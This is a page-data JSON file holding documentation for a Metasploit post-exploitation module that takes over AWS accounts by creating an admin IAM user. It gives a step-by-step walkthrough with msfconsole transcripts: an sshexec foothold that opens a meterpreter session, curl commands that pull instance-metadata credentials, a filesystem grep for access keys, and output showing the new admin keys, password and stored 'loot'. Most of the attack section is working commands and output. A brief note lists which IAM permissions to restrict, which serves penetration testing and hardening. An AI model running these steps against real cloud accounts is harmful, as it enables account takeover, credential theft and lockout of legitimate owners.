{"componentChunkName":"component---src-templates-module-documentation-template-tsx","path":"/modules/documentation/post/multi/escalate/aws_create_iam_user","result":{"data":{"moduleMetadataJson":{"id":"657077b1-db3c-5ad9-b5f4-302609300f29","name":"Create an AWS IAM User","fullname":"post/multi/escalate/aws_create_iam_user","description":"This module will attempt to create an AWS (Amazon Web Services) IAM\n          (Identity and Access Management) user with Admin privileges.","rank":300,"fields":{"detailsSlug":"/modules/details/post/multi/escalate/aws_create_iam_user","documentationSlug":"/modules/documentation/post/multi/escalate/aws_create_iam_user"},"documentation":{"html":"<h1 id=\"introduction\" style=\"position:relative;\"><a href=\"#introduction\" aria-label=\"introduction permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Introduction</h1>\n<p><code class=\"language-text\">aws_create_iam_user</code> is a simple post module that can be used to take over AWS\naccounts. Sure, it is fun enough to take over a single host, but you can own all\nhosts in the account if you simply create an admin user.</p>\n<h1 id=\"background\" style=\"position:relative;\"><a href=\"#background\" aria-label=\"background permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Background</h1>\n<h2 id=\"instance-profiles\" style=\"position:relative;\"><a href=\"#instance-profiles\" aria-label=\"instance profiles permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Instance Profiles</h2>\n<p>An Instance Profile is an AWS construct that maps a role to a host (instance).\nNot all hosts have instance profiles and/or may have restricted privileges.\nAWS roles are composed of policies which specify API calls that the host is\nallowed to make.</p>\n<h2 id=\"privileges\" style=\"position:relative;\"><a href=\"#privileges\" aria-label=\"privileges permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Privileges</h2>\n<p>This module depends on administrators being lazy and not using the least\nprivileges possible. We often see instances assigned <code class=\"language-text\">*.*</code> roles that allow\nany user on the instance to make any API call including creating admin users.\nWhen this occours, a user with long lived credentials can be created and calls\nagainst the AWS API can be made from anywhere on the Internet. Once an account\nis taken over in this manner instances can be spun up, other users can be locked\nout, networks can be traversed, and many other dangeous things can happen.</p>\n<p>Only on rare cases should hosts have the following privileges, these should be\nrestriced.</p>\n<ul>\n<li>iam:CreateUser</li>\n<li>iam:CreateGroup</li>\n<li>iam:PutGroupPolicy</li>\n<li>iam:AddUserToGroup</li>\n<li>iam:CreateAccessKey</li>\n</ul>\n<p>This module will attempt all API calls listed above in sequence. Account takeover\nmay succeed even if intermediate API calls fail. E.g., we may not be able to\ncreate a new user, but we may be able to create access keys for an existing user.</p>\n<h2 id=\"metadata-service\" style=\"position:relative;\"><a href=\"#metadata-service\" aria-label=\"metadata service permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Metadata Service</h2>\n<p>The metadata service is a mechanism the AWS hypervisor employs to pass\ninformation down into hosts. Any AWS host can retrieve information about itself\nand its environemtn by curling <a href=\"http://169.254.169.254/\">http://169.254.169.254/</a>. This mechanism is also\nused to pass temporary credentials to a host. This module pulls these temporary\ncredentials and attempts to create a user with admin privileges.</p>\n<p>To manually check that a host has an instance profile you can simply curl the\nmetadata service like so:</p>\n<div class=\"gatsby-highlight\" data-language=\"text\"><pre style=\"counter-reset: linenumber NaN\" class=\"language-text line-numbers\"><code class=\"language-text\">$ curl http://169.254.169.254/latest/meta-data/iam/security-credentials/\nSOME_ROLE_NAME\n$ curl http://169.254.169.254/latest/meta-data/iam/security-credentials/SOME_ROLE_NAME\n{\n  &quot;Code&quot; : &quot;Success&quot;,\n  &quot;LastUpdated&quot; : &quot;2016-12-07T18:36:48Z&quot;,\n  &quot;Type&quot; : &quot;AWS-HMAC&quot;,\n  &quot;AccessKeyId&quot; : &quot;ASIA\n  ...</code><span aria-hidden=\"true\" class=\"line-numbers-rows\" style=\"white-space: normal; width: auto; left: 0;\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></pre></div>\n<h1 id=\"usage\" style=\"position:relative;\"><a href=\"#usage\" aria-label=\"usage permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Usage</h1>\n<p>aws<em>create</em>iam_user can be used to take over an AWS account given access to\na host having 1). overly permissive instance profile/role, 2). API Access keys.\nOnce a foothold is established, you can run the module to pull temporary\naccess keys from the metadata service. If this fails, search the instance for\nAPI access keys, e.g., see ~/.aws/credentials, and set <code class=\"language-text\">AccessKeyId</code>,\n<code class=\"language-text\">SecretAccessKey</code>, &#x26; <code class=\"language-text\">Token</code> (optional).</p>\n<h2 id=\"establish-a-foothold\" style=\"position:relative;\"><a href=\"#establish-a-foothold\" aria-label=\"establish a foothold permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Establish a foothold</h2>\n<p>You first need a foothold in AWS, e.g., here we use <code class=\"language-text\">sshexec</code> to get the\nfoothold and launch a meterpreter session.</p>\n<div class=\"gatsby-highlight\" data-language=\"text\"><pre style=\"counter-reset: linenumber NaN\" class=\"language-text line-numbers\"><code class=\"language-text\">$ ./msfconsole\n...\nmsf &gt; use exploit/multi/ssh/sshexec\nmsf exploit(sshexec) &gt; set password some_user\npassword =&gt; some_user\nmsf exploit(sshexec) &gt; set username some_user\nusername =&gt; some_user\nmsf exploit(sshexec) &gt; set RHOST 192.168.1.2\nRHOST =&gt; 192.168.1.2\nmsf exploit(sshexec) &gt; set payload linux/x86/meterpreter/bind_tcp\npayload =&gt; linux/x86/meterpreter/bind_tcp\nmsf exploit(sshexec) &gt; exploit -j\n[*] Exploit running as background job.\n\n[*] Started bind handler\nmsf exploit(sshexec) &gt; [*] 192.168.1.2:22 - Sending stager...\n[*] Transmitting intermediate stager for over-sized stage...(105 bytes)\n[*] Command Stager progress -  42.09% done (306/727 bytes)\n[*] Command Stager progress - 100.00% done (727/727 bytes)\n[*] Sending stage (1495599 bytes) to 192.168.1.2\n[*] Meterpreter session 1 opened (192.168.1.1:33750 -&gt; 192.168.1.2:4444) at 2016-11-21 17:58:42 +0000</code><span aria-hidden=\"true\" class=\"line-numbers-rows\" style=\"white-space: normal; width: auto; left: 0;\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></pre></div>\n<p>We will be using session 1.</p>\n<div class=\"gatsby-highlight\" data-language=\"text\"><pre style=\"counter-reset: linenumber NaN\" class=\"language-text line-numbers\"><code class=\"language-text\">msf exploit(sshexec) &gt; sessions\n\nActive sessions\n===============\n\n  Id  Type                   Information                                                                       Connection\n  --  ----                   -----------                                                                       ----------\n  1   meterpreter x86/linux  uid=50011, gid=50011, euid=50011, egid=50011, suid=50011, sgid=50011 @ ip-19-...  192.168.1.1:41634 -&gt; 192.168.1.2:4444 (192.168.1.2)</code><span aria-hidden=\"true\" class=\"line-numbers-rows\" style=\"white-space: normal; width: auto; left: 0;\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></pre></div>\n<h2 id=\"options\" style=\"position:relative;\"><a href=\"#options\" aria-label=\"options permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Options</h2>\n<p>By default the module will:</p>\n<ul>\n<li>create a randomly named IAM user and group</li>\n<li>generate API Keys and User password for after</li>\n</ul>\n<p>In the event that the session'd AWS instance does not have an IAM role assigned\nto it with sufficient privileges, the following options can be used to provide\nspecific authentication material:</p>\n<ul>\n<li><code class=\"language-text\">AccessKeyId</code>: set this if you find access keys on the host and instance has no profile/privileges</li>\n<li><code class=\"language-text\">SecretAccessKey</code>: set this if you find access keys on the host and instance has no profile/privileges</li>\n<li><code class=\"language-text\">Token</code>: set this if you find access keys on the host and instance has no profile/privileges. This is optional as this signifies temporary keys, if you find these, these are most likely expired.</li>\n</ul>\n<p>The following options control the account that is being created:</p>\n<ul>\n<li><code class=\"language-text\">IAM_USERNAME</code>: set this if you would like to control the username for to user to be created</li>\n<li><code class=\"language-text\">IAM_PASSWORD</code>: set this if you would like to control the password for the created user</li>\n<li><code class=\"language-text\">CREATE_API</code>: when true, creates API keys for this user</li>\n<li><code class=\"language-text\">CREATE_CONSOLE</code>: when true, creates a password for this user so that they can access the AWS console</li>\n</ul>\n<div class=\"gatsby-highlight\" data-language=\"text\"><pre style=\"counter-reset: linenumber NaN\" class=\"language-text line-numbers\"><code class=\"language-text\">msf exploit(sshexec) &gt; use post/multi/escalate/aws_create_iam_user\nmsf post(aws_create_iam_user) &gt; show options\n\nModule options (post/multi/escalate/aws_create_iam_user):\n\n   Name             Current Setting  Required  Description\n   ----             ---------------  --------  -----------\n   AccessKeyId                       no        AWS access key\n   CREATE_API       true             yes       Add access key ID and secret access key to account (API, CLI, and SDK access)\n   CREATE_CONSOLE   true             yes       Create an account with a password for accessing the AWS management console\n   IAM_GROUPNAME                     no        Name of the group to be created (leave empty or unset to use a random name)\n   IAM_PASSWORD                      no        Password to set for the user to be created (leave empty or unset to use a random name)\n   IAM_USERNAME                      no        Name of the user to be created (leave empty or unset to use a random name)\n   Proxies                           no        A proxy chain of format type:host:port[,type:host:port][...]\n   SESSION                           yes       The session to run this module on.\n   SecretAccessKey                   no        AWS secret key\n   Token                             no        AWS session token</code><span aria-hidden=\"true\" class=\"line-numbers-rows\" style=\"white-space: normal; width: auto; left: 0;\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></pre></div>\n<h2 id=\"abusing-an-overly-permissive-instance-profile\" style=\"position:relative;\"><a href=\"#abusing-an-overly-permissive-instance-profile\" aria-label=\"abusing an overly permissive instance profile permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Abusing an Overly Permissive Instance Profile</h2>\n<p>Here we are assuming that we have taken over a host having an instance profile with\noverly permissive access. Once a session is established, we can load\n<code class=\"language-text\">aws_create_iam_user</code> and specify a meterpreter sesssion,\ne.g., <code class=\"language-text\">SESSION 1</code> and run the exploit.</p>\n<div class=\"gatsby-highlight\" data-language=\"text\"><pre style=\"counter-reset: linenumber NaN\" class=\"language-text line-numbers\"><code class=\"language-text\">msf post(aws_create_iam_user) &gt; set SESSION 1\nSESSION =&gt; 1\nmsf post(aws_create_iam_user) &gt; exploit\n\n[*] 169.254.169.254 - looking for creds...\n[*] Creating user: gavgpsjXwj5HIxiz\n[*] Creating group: gavgpsjXwj5HIxiz\n[*] Creating group policy: gavgpsjXwj5HIxiz\n[*] Adding user (gavgpsjXwj5HIxiz) to group: gavgpsjXwj5HIxiz\n[*] Creating API Keys for gavgpsjXwj5HIxiz\n[*] Creating password for gavgpsjXwj5HIxiz\nAWS Account Information\n=======================\n\nUserName          GroupName         SecretAccessKey                           AccessKeyId           Password          AccountId\n--------          ---------         ---------------                           -----------           --------          ---------\ngavgpsjXwj5HIxiz  gavgpsjXwj5HIxiz  oX4csvu3Wun+GqVDzBHQ3FNfv41UhC4ibkLAmaW2  AKIAJRZQ2ENY45KKRBHQ  gavgpsjXwj5HIxiz  xxxxx\n\n[+] AWS CLI/SDK etc can be accessed by configuring with the above listed values\n[+] AWS console URL https://xxxxx.signin.aws.amazon.com/console may be used to access this account\n[+] AWS loot stored at: /Users/yyyy/.msf4/loot/20161208140720_default_172.30.0.116_AWScredentials_099259.txt</code><span aria-hidden=\"true\" class=\"line-numbers-rows\" style=\"white-space: normal; width: auto; left: 0;\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></pre></div>\n<p>If the host does not have an instance profile or the right access, the output will look like so:</p>\n<div class=\"gatsby-highlight\" data-language=\"text\"><pre style=\"counter-reset: linenumber NaN\" class=\"language-text line-numbers\"><code class=\"language-text\">[*] 169.254.169.254 - looking for creds...\n[*] Creating user: 3SFFML3ucP1AyP7J\n[-] User: arn:aws:sts::abcd:assumed-role/msftest/i-abacadab is not authorized to perform: iam:CreateUser on resource: arn:aws:iam::abcd:user/3SFFML3ucP1AyP7J\n[*] Creating group: 3SFFML3ucP1AyP7J\n[-] User: arn:aws:sts::abcd:assumed-role/msftest/i-abacadab is not authorized to perform: iam:CreateGroup on resource: arn:aws:iam::abcd:group/3SFFML3ucP1AyP7J\n[*] Creating group policy: 3SFFML3ucP1AyP7J\n[-] User: arn:aws:sts::abcd:assumed-role/msftest/i-abacadab is not authorized to perform: iam:PutGroupPolicy on resource: group 3SFFML3ucP1AyP7J\n[*] Adding user (3SFFML3ucP1AyP7J) to group: 3SFFML3ucP1AyP7J\n[-] User: arn:aws:sts::abcd:assumed-role/msftest/i-abacadab is not authorized to perform: iam:AddUserToGroup on resource: group 3SFFML3ucP1AyP7J\n[*] Creating API Keys for 3SFFML3ucP1AyP7J\n[-] User: arn:aws:sts::abcd:assumed-role/msftest/i-abacadab is not authorized to perform: iam:CreateAccessKey on resource: user 3SFFML3ucP1AyP7J\n[*] Post module execution completed</code><span aria-hidden=\"true\" class=\"line-numbers-rows\" style=\"white-space: normal; width: auto; left: 0;\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></pre></div>\n<h2 id=\"abusing-api-access-keys\" style=\"position:relative;\"><a href=\"#abusing-api-access-keys\" aria-label=\"abusing api access keys permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Abusing API Access Keys</h2>\n<p>In the case that the host we have taken over has no instance profile or does not\nhave the required privileges, we can search the host for access keys with\nsomething like <code class=\"language-text\">grep -r AKIA /</code>. These keys may have admin privileges at which\npoint you own the account, if not we may be able to escalate privileges.\nWe can set <code class=\"language-text\">AccessKeyId</code>, <code class=\"language-text\">SecretAccessKey</code>, &#x26; <code class=\"language-text\">Token</code> (optional) and rerun\nthe exploit to test this possibility.</p>\n<div class=\"gatsby-highlight\" data-language=\"text\"><pre style=\"counter-reset: linenumber NaN\" class=\"language-text line-numbers\"><code class=\"language-text\">msf exploit(sshexec) &gt; use auxiliary/admin/aws/aws_create_iam_user\nmsf post(aws_create_iam_user) &gt; set AccessKeyId AKIAAKIAAKIAAKIAAKIA\nAccessKeyId =&gt; AKIAAKIAAKIAAKIAAKIA\nmsf post(aws_create_iam_user) &gt; set SecretAccessKey jhsdlfjkhalkjdfhalskdhfjalsjkakhksdfhlah\nSecretAccessKey =&gt; jhsdlfjkhalkjdfhalskdhfjalsjkakhksdfhlah\nmsf post(aws_create_iam_user) &gt; set SESSION 1\nSESSION =&gt; 1\nmsf post(aws_create_iam_user) &gt; run\n\n[*] 169.254.169.254 - looking for creds...\n[*] Creating user: bZWsmzyupDWxe8CT\n[*] Creating group: bZWsmzyupDWxe8CT\n[*] Creating group policy: bZWsmzyupDWxe8CT\n[*] Adding user (bZWsmzyupDWxe8CT) to group: bZWsmzyupDWxe8CT\n[*] Creating API Keys for bZWsmzyupDWxe8CT\n[*] Creating password for bZWsmzyupDWxe8CT\nAWS Account Information\n=======================\n\nUserName          GroupName         SecretAccessKey                           AccessKeyId           Password          AccountId\n--------          ---------         ---------------                           -----------           --------          ---------\nbZWsmzyupDWxe8CT  bZWsmzyupDWxe8CT  74FXOTagsYCzxz0pjPOmnsASewj4Dq/JzH3Q24qj  AKIAJ6IVXYRUQAXU625A  bZWsmzyupDWxe8CT  xxxxx\n\n[+] AWS CLI/SDK etc can be accessed by configuring with the above listed values\n[+] AWS console URL https://xxxxx.signin.aws.amazon.com/console may be used to access this account\n[+] AWS loot stored at: /Users/yyyy/.msf4/loot/20161208141050_default_172.30.0.116_AWScredentials_636339.txt\n[*] Post module execution completed</code><span aria-hidden=\"true\" class=\"line-numbers-rows\" style=\"white-space: normal; width: auto; left: 0;\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></pre></div>\n<h2 id=\"next-steps\" style=\"position:relative;\"><a href=\"#next-steps\" aria-label=\"next steps permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Next Steps</h2>\n<p>Information necessary to use the created account is printed to the screen and stored in loot:</p>\n<div class=\"gatsby-highlight\" data-language=\"text\"><pre style=\"counter-reset: linenumber NaN\" class=\"language-text line-numbers\"><code class=\"language-text\">$ cat ~/.msf4/loot/20161121175902_default_52.1.2.3_AKIA_881948.txt\n{\n  &quot;UserName&quot;: &quot;As56ekIV59OgoFOj&quot;,\n  &quot;GroupName&quot;: &quot;As56ekIV59OgoFOj&quot;,\n  &quot;SecretAccessKey&quot;: &quot;/DcYUf9veCFQF3Qcoi1eyVzptMkVTeBm5scQ9bdD&quot;,\n  &quot;AccessKeyId&quot;: &quot;AKIAIVNMYXYBXYE7VCHQ&quot;,\n  &quot;Password&quot;: &quot;As56ekIV59OgoFOj&quot;,\n  &quot;AccountId&quot;: &quot;xxx&quot;</code><span aria-hidden=\"true\" class=\"line-numbers-rows\" style=\"white-space: normal; width: auto; left: 0;\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></pre></div>\n<p>These creds can be used to call the AWS API directly or you can login using the console.</p>\n<p>Configuring the CLI:</p>\n<div class=\"gatsby-highlight\" data-language=\"text\"><pre style=\"counter-reset: linenumber NaN\" class=\"language-text line-numbers\"><code class=\"language-text\">$ aws configure --profile test\nAWS Access Key ID [None]: AKIA...\nAWS Secret Access Key [None]: THE SECRET ACCESS KEY...\nDefault region name [None]: us-west-2\nDefault output format [None]: json</code><span aria-hidden=\"true\" class=\"line-numbers-rows\" style=\"white-space: normal; width: auto; left: 0;\"><span></span><span></span><span></span><span></span><span></span></span></pre></div>\n<p>Call the API, e.g., get the Account ID:</p>\n<div class=\"gatsby-highlight\" data-language=\"text\"><pre style=\"counter-reset: linenumber NaN\" class=\"language-text line-numbers\"><code class=\"language-text\">$ aws iam --profile test list-account-aliases\n{\n    &quot;AccountAliases&quot;: [\n        &quot;Account_ID&quot;\n    ]\n}</code><span aria-hidden=\"true\" class=\"line-numbers-rows\" style=\"white-space: normal; width: auto; left: 0;\"><span></span><span></span><span></span><span></span><span></span><span></span></span></pre></div>\n<p>Login via the console using the username and password:</p>\n<p>Go to the AWS Console at <a href=\"https://Account_ID.signin.aws.amazon.com/console/\">https://Account_ID.signin.aws.amazon.com/console/</a> and login.</p>"}}},"pageContext":{"id":"657077b1-db3c-5ad9-b5f4-302609300f29"}}}